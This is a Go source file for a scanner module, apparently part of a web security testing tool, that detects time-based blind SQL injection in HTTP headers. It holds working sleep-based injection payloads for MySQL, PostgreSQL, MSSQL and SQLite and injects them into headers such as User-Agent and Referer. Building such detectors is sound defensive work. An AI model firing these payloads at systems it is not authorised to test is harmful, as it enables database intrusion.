package sqli_time_based_header

import (
	"time"

	"github.com/pkg/errors"
	"github.com/projectdiscovery/useragent"
	"github.com/vigolium/vigolium/pkg/core/hosterrors"
	"github.com/vigolium/vigolium/pkg/http"
	"github.com/vigolium/vigolium/pkg/httpmsg"
	"github.com/vigolium/vigolium/pkg/modules/infra"
	"github.com/vigolium/vigolium/pkg/modules/modkit"
	"github.com/vigolium/vigolium/pkg/output"
)

// sleepThreshold is the minimum response time to consider a timing injection confirmed.
const sleepThreshold = 12 * time.Second

// headerTimePair represents a sleep/no-sleep payload pair.
type headerTimePair struct {
	dbType   string
	sleepVal string
	noSleep  string
}

// payloadPairs contains sleep/no-sleep pairs for each DB type.
var payloadPairs = []headerTimePair{
	// MySQL
	{dbType: "mysql", sleepVal: "'XOR(if(now()=sysdate(),SLEEP(15),0))XOR'Z", noSleep: "'XOR(if(now()=sysdate(),SLEEP(0),0))XOR'Z"},
	{dbType: "mysql", sleepVal: `"XOR(if(now()=sysdate(),SLEEP(15),0))XOR"Z`, noSleep: `"XOR(if(now()=sysdate(),SLEEP(0),0))XOR"Z`},
	// PostgreSQL
	{dbType: "postgres", sleepVal: "1233'||(select 99999999 from pg_sleep(15))||'1233", noSleep: "1233'||(select 99999999 from pg_sleep(0))||'1233"},
	{dbType: "postgres", sleepVal: `1233"||(select 99999999 from pg_sleep(15))||"1233`, noSleep: `1233"||(select 99999999 from pg_sleep(0))||"1233`},
	// MSSQL
	{dbType: "mssql", sleepVal: "9999' or (select count(*) from INFORMATION_SCHEMA.tables as sys1,INFORMATION_SCHEMA.tables as sys2,INFORMATION_SCHEMA.tables as sys3,INFORMATION_SCHEMA.tables as sys4,INFORMATION_SCHEMA.tables as sys5,INFORMATION_SCHEMA.tables as sys6)=0 or '0'='9999", noSleep: "9999' or 1=0 or '0'='9999"},
	{dbType: "mssql", sleepVal: `9999" or (select count(*) from INFORMATION_SCHEMA.tables as sys1,INFORMATION_SCHEMA.tables as sys2,INFORMATION_SCHEMA.tables as sys3,INFORMATION_SCHEMA.tables as sys4,INFORMATION_SCHEMA.tables as sys5,INFORMATION_SCHEMA.tables as sys6)=0 or "0"="9999`, noSleep: `9999" or 1=0 or "0"="9999`},
	// SQLite
	{dbType: "sqlite", sleepVal: `9999'||(select like('abcdefg',upper(hex(randomblob(150000000)))))||'9999`, noSleep: `9999'||(select 1)||'9999`},
	{dbType: "sqlite", sleepVal: `9999"||(select like('abcdefg',upper(hex(randomblob(150000000)))))||"9999`, noSleep: `9999"||(select 1)||"9999`},
}

type Module struct {
	modkit.BaseActiveModule
}

func New() *Module {
	m := &Module{
		BaseActiveModule: modkit.NewBaseActiveModule(
			ModuleID,
			ModuleName,
			ModuleDesc,
			ModuleShort,
			ModuleConfirmation,
			ModuleSeverity,
			ModuleConfidence,
			modkit.ScanScopeRequest,
			modkit.AllInsertionPointTypes,
		),
	}
	m.ModuleTags = ModuleTags
	return m
}

func (m *Module) ScanPerRequest(
	ctx *httpmsg.HttpRequestResponse,
	httpClient *http.Requester,
	_ *modkit.ScanContext,
) ([]*output.ResultEvent, error) {
	var results []*output.ResultEvent

	if ctx.Request().Method() == "GET" {
		return results, nil
	}

	urlx, err := ctx.URL()
	if err != nil {
		return nil, errors.Wrap(err, "failed to get URL")
	}

	if !infra.IsValidForInjectionVulns(urlx, ctx) {
		return results, nil
	}

	headerKeys := map[string]string{
		"User-Agent":       useragent.PickRandom().String(),
		"X-Forwarded-For":  "127.0.0.1",
		"X-Forwarded-Host": "127.0.0.1",
		"Referer":          urlx.String(),
		"Origin":           urlx.String(),
	}

scan:
	for _, pair := range payloadPairs {
		// Step 1: Send sleep payload (should be slow)
		sleepRaw, err := m.buildHeaderRequest(ctx, headerKeys, pair.sleepVal)
		if err != nil {
			continue
		}
		elapsed1, err := m.sendTimedRequest(sleepRaw, ctx, httpClient)
		if err != nil {
			if errors.Is(err, hosterrors.ErrUnresponsiveHost) {
				return results, nil
			}
			continue
		}
		if elapsed1 < sleepThreshold {
			continue
		}

		// Step 2: Send no-sleep payload (should be fast)
		noSleepRaw, err := m.buildHeaderRequest(ctx, headerKeys, pair.noSleep)
		if err != nil {
			continue
		}
		elapsedNoSleep, err := m.sendTimedRequest(noSleepRaw, ctx, httpClient)
		if err != nil {
			continue
		}
		if elapsedNoSleep >= sleepThreshold {
			continue // Server is just slow, not injectable
		}

		// Step 3: Send sleep payload again (should be slow again)
		elapsed2, err := m.sendTimedRequest(sleepRaw, ctx, httpClient)
		if err != nil {
			continue
		}
		if elapsed2 < sleepThreshold {
			continue // Inconsistent — likely false positive
		}

		// All checks passed — confirmed
		fuzzedURL, _ := ctx.URL()
		var urlStr string
		if fuzzedURL != nil {
			urlStr = fuzzedURL.String()
		}
		results = append(results, &output.ResultEvent{
			URL:              urlStr,
			Request:          string(sleepRaw),
			FuzzingParameter: "Header",
			ExtractedResults: []string{pair.sleepVal, pair.noSleep, pair.dbType},
			Info: output.Info{
				Description: "Time-based blind SQL injection in HTTP headers confirmed via triple verification " +
					"(sleep/no-sleep/sleep). Database type: " + pair.dbType,
			},
		})
		break scan
	}

	return results, nil
}

// buildHeaderRequest creates a fuzzed request with the payload injected into all target headers.
func (m *Module) buildHeaderRequest(
	ctx *httpmsg.HttpRequestResponse,
	headerKeys map[string]string,
	payload string,
) ([]byte, error) {
	fuzzedRaw := ctx.Request().Raw()
	for key, value := range headerKeys {
		completePayload := value + payload
		var err error
		fuzzedRaw, err = httpmsg.ReplaceHeader(fuzzedRaw, key, completePayload)
		if err != nil {
			return nil, err
		}
	}
	return fuzzedRaw, nil
}

// sendTimedRequest parses and sends a raw request, returning the elapsed duration.
func (m *Module) sendTimedRequest(
	raw []byte,
	ctx *httpmsg.HttpRequestResponse,
	httpClient *http.Requester,
) (time.Duration, error) {
	fuzzedReq, err := httpmsg.ParseRawRequest(string(raw))
	if err != nil {
		return 0, err
	}
	fuzzedReq = fuzzedReq.WithService(ctx.Service())

	start := time.Now()
	resp, _, err := httpClient.Execute(fuzzedReq, http.Options{IgnoreTimeoutTracking: true})
	elapsed := time.Since(start)

	if err != nil {
		return 0, err
	}
	if resp != nil {
		resp.Close()
	}

	return elapsed, nil
}
